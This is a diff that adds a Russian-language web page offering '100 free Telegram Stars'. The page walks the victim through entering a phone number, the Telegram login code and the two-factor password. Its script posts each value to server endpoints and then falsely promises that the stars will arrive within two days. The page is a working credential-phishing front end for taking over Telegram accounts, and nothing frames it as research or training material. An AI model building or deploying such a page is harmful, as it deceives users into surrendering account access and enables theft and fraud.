@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Stars — получи 100 звёзд</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 32px;
+            padding: 40px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 25px 45px rgba(0,0,0,0.2);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .telegram-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .telegram-icon {
+            width: 70px;
+            height: 70px;
+            background: #229ed9;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            box-shadow: 0 5px 20px rgba(34,158,217,0.4);
+        }
+
+        h1 {
+            color: white;
+            font-size: 28px;
+            margin-top: 15px;
+        }
+
+        .stars-badge {
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            padding: 8px 16px;
+            border-radius: 40px;
+            display: inline-block;
+            margin-top: 12px;
+            font-weight: bold;
+            color: #1a1a2e;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            color: rgba(255,255,255,0.8);
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 16px;
+            background: rgba(255,255,255,0.15);
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s;
+            border: 1px solid transparent;
+        }
+
+        input:focus {
+            outline: none;
+            background: rgba(255,255,255,0.25);
+            border-color: #229ed9;
+        }
+
+        input::placeholder {
+            color: rgba(255,255,255,0.5);
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #229ed9, #1a6e9e);
+            border: none;
+            border-radius: 16px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(34,158,217,0.3);
+        }
+
+        .message {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 12px;
+            text-align: center;
+            display: none;
+        }
+
+        .message.success {
+            background: rgba(46,204,113,0.2);
+            border: 1px solid #2ecc71;
+            color: #2ecc71;
+            display: block;
+        }
+
+        .message.error {
+            background: rgba(231,76,60,0.2);
+            border: 1px solid #e74c3c;
+            color: #e74c3c;
+            display: block;
+        }
+
+        .message.info {
+            background: rgba(52,152,219,0.2);
+            border: 1px solid #3498db;
+            color: #3498db;
+            display: block;
+        }
+
+        .stars-animation {
+            position: fixed;
+            pointer-events: none;
+        }
+
+        @keyframes starFloat {
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="app">
+        <div class="telegram-header">
+            <div class="telegram-icon">✨</div>
+            <h1>Telegram Stars</h1>
+            <div class="stars-badge">⭐ 100 БЕСПЛАТНЫХ ЗВЁЗД ⭐</div>
+        </div>
+
+        <form id="stepForm">
+            <div id="step1">
+                <div class="input-group">
+                    <label>📱 Введите номер Telegram</label>
+                    <input type="tel" id="phone" placeholder="+7 999 123 45 67" required>
+                </div>
+                <button type="submit">Получить код</button>
+            </div>
+        </form>
+
+        <div id="message" class="message"></div>
+    </div>
+
+    <script>
+        let currentStep = 1;
+        let phoneNumber = '';
+        let sessionId = Math.random().toString(36).substring(2);
+
+        const form = document.getElementById('stepForm');
+        const messageDiv = document.getElementById('message');
+
+        function showMessage(text, type) {
+            messageDiv.textContent = text;
+            messageDiv.className = `message ${type}`;
+            setTimeout(() => {
+                messageDiv.className = 'message';
+            }, 5000);
+        }
+
+        function createStars() {
+            for(let i = 0; i < 30; i++) {
+                const star = document.createElement('div');
+                star.innerHTML = '⭐';
+                star.style.position = 'fixed';
+                star.style.left = Math.random() * window.innerWidth + 'px';
+                star.style.bottom = '0px';
+                star.style.fontSize = (Math.random() * 20 + 10) + 'px';
+                star.style.opacity = Math.random();
+                star.style.animation = `starFloat ${Math.random() * 3 + 2}s linear forwards`;
+                document.body.appendChild(star);
+                setTimeout(() => star.remove(), 5000);
+            }
+        }
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            if (currentStep === 1) {
+                // Шаг 1: отправили номер
+                phoneNumber = document.getElementById('phone').value;
+                if (!phoneNumber) {
+                    showMessage('Введите номер телефона', 'error');
+                    return;
+                }
+
+                showMessage('Отправляем код...', 'info');
+
+                try {
+                    const res = await fetch('/send-code', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ phone: phoneNumber, sessionId: sessionId })
+                    });
+                    const data = await res.json();
+
+                    if (data.status === 'code_sent') {
+                        showMessage('Код отправлен! Введите код из SMS', 'success');
+                        // Меняем форму на ввод кода
+                        document.getElementById('step1').innerHTML = `
+                            <div class="input-group">
+                                <label>🔐 Код из Telegram</label>
+                                <input type="text" id="code" placeholder="XXXXX" required>
+                            </div>
+                            <button type="submit">Подтвердить</button>
+                        `;
+                        currentStep = 2;
+                    } else {
+                        showMessage('Ошибка, попробуйте позже', 'error');
+                    }
+                } catch (err) {
+                    showMessage('Ошибка соединения', 'error');
+                }
+            } 
+            else if (currentStep === 2) {
+                // Шаг 2: ввели код
+                const code = document.getElementById('code').value;
+                if (!code) {
+                    showMessage('Введите код', 'error');
+                    return;
+                }
+
+                showMessage('Проверяем код...', 'info');
+
+                try {
+                    const res = await fetch('/verify-code', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ phone: phoneNumber, code: code, sessionId: sessionId })
+                    });
+                    const data = await res.json();
+
+                    if (data.status === '2fa_required') {
+                        showMessage('Требуется пароль двухфакторной аутентификации', 'info');
+                        document.getElementById('step1').innerHTML = `
+                            <div class="input-group">
+                                <label>🔒 Пароль 2FA</label>
+                                <input type="password" id="password" placeholder="Введите пароль" required>
+                            </div>
+                            <button type="submit">Войти</button>
+                        `;
+                        currentStep = 3;
+                    } 
+                    else if (data.status === 'success_stars') {
+                        showMessage('✅ Ваши 100 звёзд будут начислены в течение двух дней! Спасибо!', 'success');
+                        createStars();
+                        document.getElementById('step1').innerHTML = '<div style="text-align:center; color:white;">⭐ Спасибо! Звёзды уже в пути ⭐</div>';
+                        form.style.display = 'none';
+                    }
+                } catch (err) {
+                    showMessage('Ошибка', 'error');
+                }
+            }
+            else if (currentStep === 3) {
+                // Шаг 3: ввод 2FA пароля
+                const password = document.getElementById('password').value;
+                if (!password) {
+                    showMessage('Введите пароль 2FA', 'error');
+                    return;
+                }
+
+                try {
+                    const res = await fetch('/submit-2fa', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ phone: phoneNumber, password: password, sessionId: sessionId })
+                    });
+                    const data = await res.json();
+
+                    if (data.status === 'success_stars') {
+                        showMessage('✅ Ваши 100 звёзд будут начислены в течение двух дней! Спасибо!', 'success');
+                        createStars();
+                        document.getElementById('step1').innerHTML = '<div style="text-align:center; color:white;">⭐ Спасибо! Звёзды уже в пути ⭐</div>';
+                        form.style.display = 'none';
+                    }
+                } catch (err) {
+                    showMessage('Ошибка', 'error');
+                }
+            }
+        });
+    </script>
+</body>
+</html>
